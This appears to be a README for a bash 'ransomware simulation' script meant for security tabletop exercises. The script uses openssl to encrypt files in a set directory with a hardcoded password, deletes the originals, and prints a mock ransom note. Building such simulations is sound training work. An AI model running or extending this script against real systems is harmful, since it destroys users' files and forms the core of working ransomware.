# ransomware simulation script
CCreated a script that has similar effects of ransomware for use in tabletop security exercises and defense exercises 

The BASH scripting language was used to create this script but it can be edited for use on Windows systems. The script encrypts the files on the specified directory using AES256 symmetric but it can always be decrypted with a password. 

##SCRIPT

##Directory to "encrypt" files in <br />
TARGET_DIR="/home/workstation/Downloads" #input the path to the directory you want to encrypt <br />

##Encryption key<br />
ENCRYPTION_KEY="passwords"<br />

##Check if the target directory exists<br />
if [ ! -d "$TARGET_DIR" ]; then<br />
  echo "Directory $TARGET_DIR does not exist."<br />
  exit 1<br />
fi<br />

##Encrypt existing files using AES-256<br />
echo "Encrypting files in $TARGET_DIR..."<br />
for FILE in "$TARGET_DIR"/*.txt.cis; do<br />
  if [ -f "$FILE" ]; then<br />
    # Encrypt the file in aes256 and add .encrypted to the end<br />
    openssl enc -aes-256-cbc -in "$FILE" -out "${FILE}.encrypted" -pass pass:"$ENCRYPTION_KEY"<br />
    rm "$FILE" # Remove original file<br />
    echo "$FILE has been encrypted."<br />
  fi<br />
done<br />

##Display ransom note<br />
echo -e "\nYour files have been 'encrypted'. To recover them, follow the steps listed. report and we sell data"<br />
